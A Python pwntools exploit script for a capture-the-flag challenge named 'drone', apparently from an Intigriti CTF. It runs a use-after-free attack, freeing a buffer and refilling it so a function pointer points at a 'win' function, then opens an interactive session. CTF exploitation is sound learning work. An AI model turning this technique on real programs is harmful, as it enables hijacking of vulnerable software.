#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './drone'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "50"]
host, port = 'uap.ctf.intigriti.io', 1340

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#└─$ pwn checksec drone 
#[*] '/home/kali/Windows/Intigriti1337Up/uap/challenge/drone'
#    Arch:       amd64-64-little
#    RELRO:      Partial RELRO
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        No PIE (0x400000)
#    Stripped:   No
#    Debuginfo:  Yes



def alloc():
    io.sendlineafter(b'5. Exit', b'1')

def free(idx):
    io.sendlineafter(b'5. Exit', b'2')
    io.sendline(str(idx).encode())

def view(idx):
    io.sendlineafter(b'5. Exit', b'3')
    io.sendline(str(idx).encode())

def malloc(val):
    io.sendlineafter(b'5. Exit', b'4')
    io.sendlineafter(b"Allocated route buffer at ", val)


def exploit():
    global io
    io = initialize()
    alloc()
    free(1)
    malloc(p64(0x0)*2 + p64(elf.sym["print_drone_manual"]))
    view(1) #call the win function
    io.interactive()
    
if __name__ == '__main__':
    exploit()

